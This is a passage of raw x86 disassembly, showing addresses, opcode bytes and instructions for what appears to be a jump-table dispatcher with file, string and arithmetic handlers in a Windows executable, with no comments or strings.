  4016d3:	0f 84 1b 11 00 00    	je     0x4027f4
  4016d9:	57                   	push   %edi
  4016da:	56                   	push   %esi
  4016db:	e8 fe 4a 00 00       	call   0x4061de
  4016e0:	6a e4                	push   $0xffffffe4
  4016e2:	e9 2a 0c 00 00       	jmp    0x402311
  4016e7:	53                   	push   %ebx
  4016e8:	e8 78 15 00 00       	call   0x402c65
  4016ed:	8b f0                	mov    %eax,%esi
  4016ef:	8d 45 08             	lea    0x8(%ebp),%eax
  4016f2:	50                   	push   %eax
  4016f3:	57                   	push   %edi
  4016f4:	68 00 04 00 00       	push   $0x400
  4016f9:	56                   	push   %esi
  4016fa:	ff 15 e4 80 40 00    	call   *0x4080e4
  401700:	85 c0                	test   %eax,%eax
  401702:	74 23                	je     0x401727
  401704:	8b 45 08             	mov    0x8(%ebp),%eax
  401707:	3b c6                	cmp    %esi,%eax
  401709:	76 25                	jbe    0x401730
  40170b:	38 18                	cmp    %bl,(%eax)
  40170d:	74 21                	je     0x401730
  40170f:	56                   	push   %esi
  401710:	e8 83 50 00 00       	call   0x406798
  401715:	3b c3                	cmp    %ebx,%eax
  401717:	74 0e                	je     0x401727
  401719:	83 c0 2c             	add    $0x2c,%eax
  40171c:	50                   	push   %eax
  40171d:	ff 75 08             	push   0x8(%ebp)
  401720:	e8 e0 4c 00 00       	call   0x406405
  401725:	eb 09                	jmp    0x401730
  401727:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40172e:	88 1f                	mov    %bl,(%edi)
  401730:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401733:	0f 85 b8 13 00 00    	jne    0x402af1
  401739:	68 00 04 00 00       	push   $0x400
  40173e:	57                   	push   %edi
  40173f:	57                   	push   %edi
  401740:	ff 15 e8 80 40 00    	call   *0x4080e8
  401746:	e9 a6 13 00 00       	jmp    0x402af1
  40174b:	6a ff                	push   $0xffffffff
  40174d:	e8 13 15 00 00       	call   0x402c65
  401752:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401755:	51                   	push   %ecx
  401756:	56                   	push   %esi
  401757:	68 00 04 00 00       	push   $0x400
  40175c:	53                   	push   %ebx
  40175d:	50                   	push   %eax
  40175e:	53                   	push   %ebx
  40175f:	ff 15 ec 80 40 00    	call   *0x4080ec
  401765:	85 c0                	test   %eax,%eax
  401767:	0f 85 84 13 00 00    	jne    0x402af1
  40176d:	e9 56 10 00 00       	jmp    0x4027c8
  401772:	6a ef                	push   $0xffffffef
  401774:	e8 ec 14 00 00       	call   0x402c65
  401779:	50                   	push   %eax
  40177a:	56                   	push   %esi
  40177b:	e8 47 48 00 00       	call   0x405fc7
  401780:	e9 4e fe ff ff       	jmp    0x4015d3
  401785:	6a 31                	push   $0x31
  401787:	e8 d9 14 00 00       	call   0x402c65
  40178c:	8b f0                	mov    %eax,%esi
  40178e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401791:	83 e0 07             	and    $0x7,%eax
  401794:	56                   	push   %esi
  401795:	89 75 f8             	mov    %esi,-0x8(%ebp)
  401798:	89 45 08             	mov    %eax,0x8(%ebp)
  40179b:	e8 64 46 00 00       	call   0x405e04
  4017a0:	56                   	push   %esi
  4017a1:	be 20 a4 40 00       	mov    $0x40a420,%esi
  4017a6:	85 c0                	test   %eax,%eax
  4017a8:	74 08                	je     0x4017b2
  4017aa:	56                   	push   %esi
  4017ab:	e8 55 4c 00 00       	call   0x406405
  4017b0:	eb 17                	jmp    0x4017c9
  4017b2:	68 00 a8 42 00       	push   $0x42a800
  4017b7:	56                   	push   %esi
  4017b8:	e8 48 4c 00 00       	call   0x406405
  4017bd:	50                   	push   %eax
  4017be:	e8 d4 45 00 00       	call   0x405d97
  4017c3:	50                   	push   %eax
  4017c4:	e8 58 4c 00 00       	call   0x406421
  4017c9:	56                   	push   %esi
  4017ca:	e8 30 4f 00 00       	call   0x4066ff
  4017cf:	bf 20 ac 40 00       	mov    $0x40ac20,%edi
  4017d4:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4017d8:	7c 31                	jl     0x40180b
  4017da:	56                   	push   %esi
  4017db:	e8 b8 4f 00 00       	call   0x406798
  4017e0:	33 c9                	xor    %ecx,%ecx
  4017e2:	3b c3                	cmp    %ebx,%eax
  4017e4:	74 10                	je     0x4017f6
  4017e6:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4017e9:	83 c0 14             	add    $0x14,%eax
  4017ec:	51                   	push   %ecx
  4017ed:	50                   	push   %eax
  4017ee:	ff 15 f0 80 40 00    	call   *0x4080f0
  4017f4:	8b c8                	mov    %eax,%ecx
  4017f6:	8b 45 08             	mov    0x8(%ebp),%eax
  4017f9:	83 c0 fd             	add    $0xfffffffd,%eax
  4017fc:	0d 00 00 00 80       	or     $0x80000000,%eax
  401801:	23 c1                	and    %ecx,%eax
  401803:	f7 d8                	neg    %eax
  401805:	1b c0                	sbb    %eax,%eax
  401807:	40                   	inc    %eax
  401808:	89 45 08             	mov    %eax,0x8(%ebp)
  40180b:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40180e:	75 06                	jne    0x401816
  401810:	56                   	push   %esi
  401811:	e8 5d 47 00 00       	call   0x405f73
  401816:	33 c0                	xor    %eax,%eax
  401818:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  40181c:	0f 95 c0             	setne  %al
  40181f:	40                   	inc    %eax
  401820:	50                   	push   %eax
  401821:	68 00 00 00 40       	push   $0x40000000
  401826:	56                   	push   %esi
  401827:	e8 6c 47 00 00       	call   0x405f98
  40182c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40182f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401832:	75 76                	jne    0x4018aa
  401834:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  401837:	75 53                	jne    0x40188c
  401839:	68 00 50 42 00       	push   $0x425000
  40183e:	57                   	push   %edi
  40183f:	e8 c1 4b 00 00       	call   0x406405
  401844:	56                   	push   %esi
  401845:	68 00 50 42 00       	push   $0x425000
  40184a:	e8 b6 4b 00 00       	call   0x406405
  40184f:	ff 75 f0             	push   -0x10(%ebp)
  401852:	68 20 a8 40 00       	push   $0x40a820
  401857:	e8 3c 4c 00 00       	call   0x406498
  40185c:	57                   	push   %edi
  40185d:	68 00 50 42 00       	push   $0x425000
  401862:	e8 9e 4b 00 00       	call   0x406405
  401867:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40186a:	c1 f8 03             	sar    $0x3,%eax
  40186d:	50                   	push   %eax
  40186e:	68 20 a8 40 00       	push   $0x40a820
  401873:	e8 a3 42 00 00       	call   0x405b1b
  401878:	83 e8 04             	sub    $0x4,%eax
  40187b:	0f 84 53 ff ff ff    	je     0x4017d4
  401881:	48                   	dec    %eax
  401882:	74 1b                	je     0x40189f
  401884:	56                   	push   %esi
  401885:	6a fa                	push   $0xfffffffa
  401887:	e9 06 fc ff ff       	jmp    0x401492
  40188c:	ff 75 f8             	push   -0x8(%ebp)
  40188f:	6a e2                	push   $0xffffffe2
  401891:	e8 b3 3c 00 00       	call   0x405549
  401896:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  40189a:	e9 36 fd ff ff       	jmp    0x4015d5
  40189f:	ff 05 e8 43 42 00    	incl   0x4243e8
  4018a5:	e9 50 12 00 00       	jmp    0x402afa
  4018aa:	ff 75 f8             	push   -0x8(%ebp)
  4018ad:	6a ea                	push   $0xffffffea
  4018af:	e8 95 3c 00 00       	call   0x405549
  4018b4:	ff 05 14 44 42 00    	incl   0x424414
  4018ba:	53                   	push   %ebx
  4018bb:	53                   	push   %ebx
  4018bc:	ff 75 f4             	push   -0xc(%ebp)
  4018bf:	ff 75 e4             	push   -0x1c(%ebp)
  4018c2:	e8 95 19 00 00       	call   0x40325c
  4018c7:	ff 0d 14 44 42 00    	decl   0x424414
  4018cd:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  4018d1:	8b f8                	mov    %eax,%edi
  4018d3:	75 06                	jne    0x4018db
  4018d5:	83 7d ec ff          	cmpl   $0xffffffff,-0x14(%ebp)
  4018d9:	74 12                	je     0x4018ed
  4018db:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4018de:	50                   	push   %eax
  4018df:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4018e2:	53                   	push   %ebx
  4018e3:	50                   	push   %eax
  4018e4:	ff 75 f4             	push   -0xc(%ebp)
  4018e7:	ff 15 f4 80 40 00    	call   *0x4080f4
  4018ed:	ff 75 f4             	push   -0xc(%ebp)
  4018f0:	ff 15 f8 80 40 00    	call   *0x4080f8
  4018f6:	3b fb                	cmp    %ebx,%edi
  4018f8:	0f 8d f3 11 00 00    	jge    0x402af1
  4018fe:	83 ff fe             	cmp    $0xfffffffe,%edi
  401901:	75 13                	jne    0x401916
  401903:	6a e9                	push   $0xffffffe9
  401905:	56                   	push   %esi
  401906:	e8 8d 4b 00 00       	call   0x406498
  40190b:	ff 75 f8             	push   -0x8(%ebp)
  40190e:	56                   	push   %esi
  40190f:	e8 0d 4b 00 00       	call   0x406421
  401914:	eb 08                	jmp    0x40191e
  401916:	6a ee                	push   $0xffffffee
  401918:	56                   	push   %esi
  401919:	e8 7a 4b 00 00       	call   0x406498
  40191e:	68 10 00 20 00       	push   $0x200010
  401923:	56                   	push   %esi
  401924:	e9 8d 0a 00 00       	jmp    0x4023b6
  401929:	53                   	push   %ebx
  40192a:	eb 34                	jmp    0x401960
  40192c:	6a 31                	push   $0x31
  40192e:	e8 32 13 00 00       	call   0x402c65
  401933:	ff 75 dc             	push   -0x24(%ebp)
  401936:	50                   	push   %eax
  401937:	e8 df 41 00 00       	call   0x405b1b
  40193c:	3b c3                	cmp    %ebx,%eax
  40193e:	0f 84 b0 0e 00 00    	je     0x4027f4
  401944:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  401947:	0f 84 67 01 00 00    	je     0x401ab4
  40194d:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  401950:	0f 85 9b 11 00 00    	jne    0x402af1
  401956:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401959:	e9 9e 11 00 00       	jmp    0x402afc
  40195e:	6a f0                	push   $0xfffffff0
  401960:	e8 00 13 00 00       	call   0x402c65
  401965:	ff 75 e0             	push   -0x20(%ebp)
  401968:	50                   	push   %eax
  401969:	e8 59 42 00 00       	call   0x405bc7
  40196e:	e9 7e 11 00 00       	jmp    0x402af1
  401973:	6a 01                	push   $0x1
  401975:	e8 eb 12 00 00       	call   0x402c65
  40197a:	50                   	push   %eax
  40197b:	e8 9b 4a 00 00       	call   0x40641b
  401980:	e9 cf 0c 00 00       	jmp    0x402654
  401985:	6a 02                	push   $0x2
  401987:	e8 b7 12 00 00       	call   0x402c43
  40198c:	6a 03                	push   $0x3
  40198e:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  401991:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401994:	e8 aa 12 00 00       	call   0x402c43
  401999:	59                   	pop    %ecx
  40199a:	8b f8                	mov    %eax,%edi
  40199c:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40199f:	59                   	pop    %ecx
  4019a0:	6a 01                	push   $0x1
  4019a2:	89 7d 84             	mov    %edi,-0x7c(%ebp)
  4019a5:	89 55 88             	mov    %edx,-0x78(%ebp)
  4019a8:	89 45 08             	mov    %eax,0x8(%ebp)
  4019ab:	e8 b5 12 00 00       	call   0x402c65
  4019b0:	50                   	push   %eax
  4019b1:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4019b4:	e8 62 4a 00 00       	call   0x40641b
  4019b9:	39 5d c8             	cmp    %ebx,-0x38(%ebp)
  4019bc:	88 1e                	mov    %bl,(%esi)
  4019be:	75 03                	jne    0x4019c3
  4019c0:	89 45 08             	mov    %eax,0x8(%ebp)
  4019c3:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019c6:	0f 84 25 11 00 00    	je     0x402af1
  4019cc:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  4019cf:	3b cb                	cmp    %ebx,%ecx
  4019d1:	7d 0b                	jge    0x4019de
  4019d3:	8d 3c 08             	lea    (%eax,%ecx,1),%edi
  4019d6:	3b fb                	cmp    %ebx,%edi
  4019d8:	0f 8c 13 11 00 00    	jl     0x402af1
  4019de:	3b f8                	cmp    %eax,%edi
  4019e0:	7e 02                	jle    0x4019e4
  4019e2:	8b f8                	mov    %eax,%edi
  4019e4:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4019e7:	03 c7                	add    %edi,%eax
  4019e9:	50                   	push   %eax
  4019ea:	56                   	push   %esi
  4019eb:	e8 15 4a 00 00       	call   0x406405
  4019f0:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019f3:	7d 0e                	jge    0x401a03
  4019f5:	56                   	push   %esi
  4019f6:	e8 20 4a 00 00       	call   0x40641b
  4019fb:	01 45 08             	add    %eax,0x8(%ebp)
  4019fe:	79 03                	jns    0x401a03
  401a00:	89 5d 08             	mov    %ebx,0x8(%ebp)
  401a03:	8b 45 08             	mov    0x8(%ebp),%eax
  401a06:	3d 00 04 00 00       	cmp    $0x400,%eax
  401a0b:	0f 8d e0 10 00 00    	jge    0x402af1
  401a11:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  401a14:	e9 d8 10 00 00       	jmp    0x402af1
  401a19:	6a 20                	push   $0x20
  401a1b:	e8 45 12 00 00       	call   0x402c65
  401a20:	6a 31                	push   $0x31
  401a22:	8b f0                	mov    %eax,%esi
  401a24:	e8 3c 12 00 00       	call   0x402c65
  401a29:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  401a2c:	50                   	push   %eax
  401a2d:	56                   	push   %esi
  401a2e:	75 12                	jne    0x401a42
  401a30:	ff 15 fc 80 40 00    	call   *0x4080fc
  401a36:	85 c0                	test   %eax,%eax
  401a38:	75 7a                	jne    0x401ab4
  401a3a:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401a3d:	e9 ba 10 00 00       	jmp    0x402afc
  401a42:	ff 15 00 81 40 00    	call   *0x408100
  401a48:	eb ec                	jmp    0x401a36
  401a4a:	33 ff                	xor    %edi,%edi
  401a4c:	47                   	inc    %edi
  401a4d:	57                   	push   %edi
  401a4e:	e8 12 12 00 00       	call   0x402c65
  401a53:	68 00 04 00 00       	push   $0x400
  401a58:	56                   	push   %esi
  401a59:	50                   	push   %eax
  401a5a:	89 45 08             	mov    %eax,0x8(%ebp)
  401a5d:	ff 15 04 81 40 00    	call   *0x408104
  401a63:	85 c0                	test   %eax,%eax
  401a65:	74 13                	je     0x401a7a
  401a67:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401a6a:	74 13                	je     0x401a7f
  401a6c:	56                   	push   %esi
  401a6d:	ff 75 08             	push   0x8(%ebp)
  401a70:	ff 15 00 81 40 00    	call   *0x408100
  401a76:	85 c0                	test   %eax,%eax
  401a78:	75 05                	jne    0x401a7f
  401a7a:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401a7d:	88 1e                	mov    %bl,(%esi)
  401a7f:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  401a85:	e9 67 10 00 00       	jmp    0x402af1
  401a8a:	8b 75 f0             	mov    -0x10(%ebp),%esi
  401a8d:	53                   	push   %ebx
  401a8e:	e8 b0 11 00 00       	call   0x402c43
  401a93:	6a 01                	push   $0x1
  401a95:	8b f8                	mov    %eax,%edi
  401a97:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401a9a:	e8 a4 11 00 00       	call   0x402c43
  401a9f:	59                   	pop    %ecx
  401aa0:	3b f3                	cmp    %ebx,%esi
  401aa2:	59                   	pop    %ecx
  401aa3:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401aa6:	75 08                	jne    0x401ab0
  401aa8:	3b f8                	cmp    %eax,%edi
  401aaa:	7c 08                	jl     0x401ab4
  401aac:	7e 8c                	jle    0x401a3a
  401aae:	eb 12                	jmp    0x401ac2
  401ab0:	3b f8                	cmp    %eax,%edi
  401ab2:	73 08                	jae    0x401abc
  401ab4:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401ab7:	e9 40 10 00 00       	jmp    0x402afc
  401abc:	0f 86 78 ff ff ff    	jbe    0x401a3a
  401ac2:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401ac5:	e9 32 10 00 00       	jmp    0x402afc
  401aca:	6a 01                	push   $0x1
  401acc:	e8 72 11 00 00       	call   0x402c43
  401ad1:	8b f8                	mov    %eax,%edi
  401ad3:	6a 02                	push   $0x2
  401ad5:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401ad8:	89 7d 08             	mov    %edi,0x8(%ebp)
  401adb:	e8 63 11 00 00       	call   0x402c43
  401ae0:	59                   	pop    %ecx
  401ae1:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401ae4:	59                   	pop    %ecx
  401ae5:	8b c8                	mov    %eax,%ecx
  401ae7:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401aea:	83 f8 0d             	cmp    $0xd,%eax
  401aed:	0f 87 94 00 00 00    	ja     0x401b87
  401af3:	ff 24 85 0b 2c 40 00 	jmp    *0x402c0b(,%eax,4)
  401afa:	03 f9                	add    %ecx,%edi
  401afc:	e9 5a 03 00 00       	jmp    0x401e5b
  401b01:	2b f9                	sub    %ecx,%edi
  401b03:	e9 53 03 00 00       	jmp    0x401e5b
  401b08:	0f af cf             	imul   %edi,%ecx
  401b0b:	eb 1a                	jmp    0x401b27
  401b0d:	3b cb                	cmp    %ebx,%ecx
  401b0f:	74 53                	je     0x401b64
  401b11:	8b c7                	mov    %edi,%eax
  401b13:	99                   	cltd
  401b14:	f7 f9                	idiv   %ecx
  401b16:	8b f8                	mov    %eax,%edi
  401b18:	e9 3e 03 00 00       	jmp    0x401e5b
  401b1d:	0b cf                	or     %edi,%ecx
  401b1f:	eb 06                	jmp    0x401b27
  401b21:	23 cf                	and    %edi,%ecx
  401b23:	eb 02                	jmp    0x401b27
  401b25:	33 cf                	xor    %edi,%ecx
  401b27:	8b f9                	mov    %ecx,%edi
  401b29:	e9 2d 03 00 00       	jmp    0x401e5b
  401b2e:	33 c0                	xor    %eax,%eax
  401b30:	3b fb                	cmp    %ebx,%edi
  401b32:	0f 94 c0             	sete   %al
  401b35:	eb df                	jmp    0x401b16
  401b37:	3b fb                	cmp    %ebx,%edi
  401b39:	75 11                	jne    0x401b4c
  401b3b:	eb 0b                	jmp    0x401b48
  401b3d:	33 ff                	xor    %edi,%edi
  401b3f:	e9 17 03 00 00       	jmp    0x401e5b
  401b44:	3b fb                	cmp    %ebx,%edi
  401b46:	74 f5                	je     0x401b3d
  401b48:	3b cb                	cmp    %ebx,%ecx
  401b4a:	74 f1                	je     0x401b3d
  401b4c:	33 ff                	xor    %edi,%edi
  401b4e:	47                   	inc    %edi
  401b4f:	e9 07 03 00 00       	jmp    0x401e5b
  401b54:	3b cb                	cmp    %ebx,%ecx
  401b56:	74 0c                	je     0x401b64
  401b58:	8b c7                	mov    %edi,%eax
  401b5a:	99                   	cltd
  401b5b:	f7 f9                	idiv   %ecx
  401b5d:	8b fa                	mov    %edx,%edi
  401b5f:	e9 f7 02 00 00       	jmp    0x401e5b
  401b64:	33 ff                	xor    %edi,%edi
  401b66:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401b6d:	e9 e9 02 00 00       	jmp    0x401e5b
  401b72:	d3 e7                	shl    %cl,%edi
  401b74:	e9 e2 02 00 00       	jmp    0x401e5b
  401b79:	d3 ff                	sar    %cl,%edi
  401b7b:	e9 db 02 00 00       	jmp    0x401e5b
  401b80:	d3 ef                	shr    %cl,%edi
  401b82:	e9 d4 02 00 00       	jmp    0x401e5b
  401b87:	8b 7d 08             	mov    0x8(%ebp),%edi
  401b8a:	e9 cc 02 00 00       	jmp    0x401e5b
  401b8f:	6a 01                	push   $0x1
  401b91:	e8 cf 10 00 00       	call   0x402c65
  401b96:	6a 02                	push   $0x2
  401b98:	8b f8                	mov    %eax,%edi
  401b9a:	e8 a4 10 00 00       	call   0x402c43
  401b9f:	50                   	push   %eax
  401ba0:	57                   	push   %edi
  401ba1:	56                   	push   %esi
  401ba2:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401ba5:	ff 15 18 82 40 00    	call   *0x408218
  401bab:	83 c4 10             	add    $0x10,%esp
  401bae:	e9 3e 0f 00 00       	jmp    0x402af1
  401bb3:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401bb6:	8b 3d 60 b8 40 00    	mov    0x40b860,%edi
  401bbc:	3b c3                	cmp    %ebx,%eax
  401bbe:	74 44                	je     0x401c04
  401bc0:	48                   	dec    %eax
  401bc1:	3b fb                	cmp    %ebx,%edi
  401bc3:	0f 84 df 07 00 00    	je     0x4023a8
  401bc9:	8b 3f                	mov    (%edi),%edi
  401bcb:	3b c3                	cmp    %ebx,%eax
  401bcd:	75 f1                	jne    0x401bc0
  401bcf:	3b fb                	cmp    %ebx,%edi
  401bd1:	0f 84 d1 07 00 00    	je     0x4023a8
  401bd7:	83 c7 04             	add    $0x4,%edi
  401bda:	be 20 a4 40 00       	mov    $0x40a420,%esi
  401bdf:	57                   	push   %edi
  401be0:	56                   	push   %esi
  401be1:	e8 1f 48 00 00       	call   0x406405
  401be6:	a1 60 b8 40 00       	mov    0x40b860,%eax
  401beb:	83 c0 04             	add    $0x4,%eax
  401bee:	50                   	push   %eax
  401bef:	57                   	push   %edi
  401bf0:	e8 10 48 00 00       	call   0x406405
  401bf5:	a1 60 b8 40 00       	mov    0x40b860,%eax
  401bfa:	56                   	push   %esi
  401bfb:	83 c0 04             	add    $0x4,%eax
  401bfe:	50                   	push   %eax
  401bff:	e9 59 0d 00 00       	jmp    0x40295d
  401c04:	3b d3                	cmp    %ebx,%edx
  401c06:	74 25                	je     0x401c2d
  401c08:	3b fb                	cmp    %ebx,%edi
  401c0a:	0f 84 e4 0b 00 00    	je     0x4027f4
  401c10:	8d 47 04             	lea    0x4(%edi),%eax
  401c13:	50                   	push   %eax
  401c14:	56                   	push   %esi
  401c15:	e8 eb 47 00 00       	call   0x406405
  401c1a:	8b 07                	mov    (%edi),%eax
  401c1c:	57                   	push   %edi
  401c1d:	a3 60 b8 40 00       	mov    %eax,0x40b860
  401c22:	ff 15 08 81 40 00    	call   *0x408108
  401c28:	e9 c4 0e 00 00       	jmp    0x402af1
  401c2d:	68 04 04 00 00       	push   $0x404
  401c32:	6a 40                	push   $0x40
  401c34:	ff 15 0c 81 40 00    	call   *0x40810c
  401c3a:	ff 75 dc             	push   -0x24(%ebp)
  401c3d:	8b f0                	mov    %eax,%esi
  401c3f:	8d 46 04             	lea    0x4(%esi),%eax
  401c42:	50                   	push   %eax
  401c43:	e8 50 48 00 00       	call   0x406498
  401c48:	a1 60 b8 40 00       	mov    0x40b860,%eax
  401c4d:	89 06                	mov    %eax,(%esi)
  401c4f:	89 35 60 b8 40 00    	mov    %esi,0x40b860
  401c55:	e9 97 0e 00 00       	jmp    0x402af1
  401c5a:	6a 03                	push   $0x3
  401c5c:	e8 e2 0f 00 00       	call   0x402c43
  401c61:	6a 04                	push   $0x4
  401c63:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401c66:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c69:	e8 d5 0f 00 00       	call   0x402c43
  401c6e:	f6 45 f0 01          	testb  $0x1,-0x10(%ebp)
  401c72:	59                   	pop    %ecx
  401c73:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401c76:	59                   	pop    %ecx
  401c77:	89 45 08             	mov    %eax,0x8(%ebp)
  401c7a:	74 0a                	je     0x401c86
  401c7c:	6a 33                	push   $0x33
  401c7e:	e8 e2 0f 00 00       	call   0x402c65
  401c83:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c86:	f6 45 f0 02          	testb  $0x2,-0x10(%ebp)
  401c8a:	74 0a                	je     0x401c96
  401c8c:	6a 44                	push   $0x44
  401c8e:	e8 d2 0f 00 00       	call   0x402c65
  401c93:	89 45 08             	mov    %eax,0x8(%ebp)
  401c96:	83 7d d8 21          	cmpl   $0x21,-0x28(%ebp)
  401c9a:	6a 01                	push   $0x1
  401c9c:	75 4c                	jne    0x401cea
  401c9e:	e8 a0 0f 00 00       	call   0x402c43
  401ca3:	6a 02                	push   $0x2
  401ca5:	8b f8                	mov    %eax,%edi
  401ca7:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401caa:	e8 94 0f 00 00       	call   0x402c43
  401caf:	59                   	pop    %ecx
  401cb0:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401cb3:	59                   	pop    %ecx
  401cb4:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401cb7:	c1 f9 02             	sar    $0x2,%ecx
  401cba:	74 1e                	je     0x401cda
  401cbc:	8d 55 f4             	lea    -0xc(%ebp),%edx
  401cbf:	52                   	push   %edx
  401cc0:	51                   	push   %ecx
  401cc1:	53                   	push   %ebx
  401cc2:	ff 75 08             	push   0x8(%ebp)
  401cc5:	ff 75 f8             	push   -0x8(%ebp)
  401cc8:	50                   	push   %eax
  401cc9:	57                   	push   %edi
  401cca:	ff 15 1c 82 40 00    	call   *0x40821c
  401cd0:	f7 d8                	neg    %eax
  401cd2:	1b c0                	sbb    %eax,%eax
  401cd4:	40                   	inc    %eax
  401cd5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401cd8:	eb 3f                	jmp    0x401d19
  401cda:	ff 75 08             	push   0x8(%ebp)
  401cdd:	ff 75 f8             	push   -0x8(%ebp)
  401ce0:	50                   	push   %eax
  401ce1:	57                   	push   %edi
  401ce2:	ff 15 44 82 40 00    	call   *0x408244
  401ce8:	eb 2c                	jmp    0x401d16
  401cea:	e8 76 0f 00 00       	call   0x402c65
  401cef:	6a 12                	push   $0x12
  401cf1:	8b f8                	mov    %eax,%edi
  401cf3:	e8 6d 0f 00 00       	call   0x402c65
  401cf8:	8a 08                	mov    (%eax),%cl
  401cfa:	f6 d9                	neg    %cl
  401cfc:	1b c9                	sbb    %ecx,%ecx
  401cfe:	23 c8                	and    %eax,%ecx
  401d00:	8a 07                	mov    (%edi),%al
  401d02:	f6 d8                	neg    %al
  401d04:	1b c0                	sbb    %eax,%eax
  401d06:	51                   	push   %ecx
  401d07:	23 c7                	and    %edi,%eax
  401d09:	50                   	push   %eax
  401d0a:	ff 75 08             	push   0x8(%ebp)
  401d0d:	ff 75 f8             	push   -0x8(%ebp)
  401d10:	ff 15 20 82 40 00    	call   *0x408220
  401d16:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401d19:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401d1c:	0f 8c cf 0d 00 00    	jl     0x402af1
  401d22:	ff 75 f4             	push   -0xc(%ebp)
  401d25:	e9 64 f8 ff ff       	jmp    0x40158e
  401d2a:	53                   	push   %ebx
  401d2b:	e8 13 0f 00 00       	call   0x402c43
  401d30:	59                   	pop    %ecx
  401d31:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401d34:	50                   	push   %eax
  401d35:	ff 15 24 82 40 00    	call   *0x408224
  401d3b:	85 c0                	test   %eax,%eax
  401d3d:	0f 84 f7 fc ff ff    	je     0x401a3a
  401d43:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401d46:	e9 b1 0d 00 00       	jmp    0x402afc
  401d4b:	6a 02                	push   $0x2
  401d4d:	e8 f1 0e 00 00       	call   0x402c43
  401d52:	6a 01                	push   $0x1
  401d54:	8b f8                	mov    %eax,%edi
  401d56:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401d59:	e8 e5 0e 00 00       	call   0x402c43
  401d5e:	59                   	pop    %ecx
  401d5f:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401d62:	59                   	pop    %ecx
  401d63:	57                   	push   %edi
  401d64:	50                   	push   %eax
  401d65:	ff 15 28 82 40 00    	call   *0x408228
  401d6b:	e9 e4 08 00 00       	jmp    0x402654
  401d70:	a1 a8 43 42 00       	mov    0x4243a8,%eax
  401d75:	53                   	push   %ebx
  401d76:	8d 34 10             	lea    (%eax,%edx,1),%esi
  401d79:	e8 c5 0e 00 00       	call   0x402c43
  401d7e:	59                   	pop    %ecx
  401d7f:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401d82:	56                   	push   %esi
  401d83:	6a eb                	push   $0xffffffeb
  401d85:	50                   	push   %eax
  401d86:	ff 15 2c 82 40 00    	call   *0x40822c
  401d8c:	e9 60 0d 00 00       	jmp    0x402af1
  401d91:	f6 45 e9 01          	testb  $0x1,-0x17(%ebp)
  401d95:	74 0d                	je     0x401da4
  401d97:	6a 02                	push   $0x2
  401d99:	e8 a5 0e 00 00       	call   0x402c43
  401d9e:	59                   	pop    %ecx
  401d9f:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401da2:	eb 0c                	jmp    0x401db0
  401da4:	ff 75 e4             	push   -0x1c(%ebp)
  401da7:	ff 75 f8             	push   -0x8(%ebp)
  401daa:	ff 15 28 82 40 00    	call   *0x408228
  401db0:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401db3:	89 45 08             	mov    %eax,0x8(%ebp)
  401db6:	8b c1                	mov    %ecx,%eax
  401db8:	8b f9                	mov    %ecx,%edi
  401dba:	83 e0 03             	and    $0x3,%eax
  401dbd:	83 e7 04             	and    $0x4,%edi
  401dc0:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401dc3:	8b c1                	mov    %ecx,%eax
  401dc5:	c1 e8 1f             	shr    $0x1f,%eax
  401dc8:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401dcb:	8b c1                	mov    %ecx,%eax
  401dcd:	c1 e8 1e             	shr    $0x1e,%eax
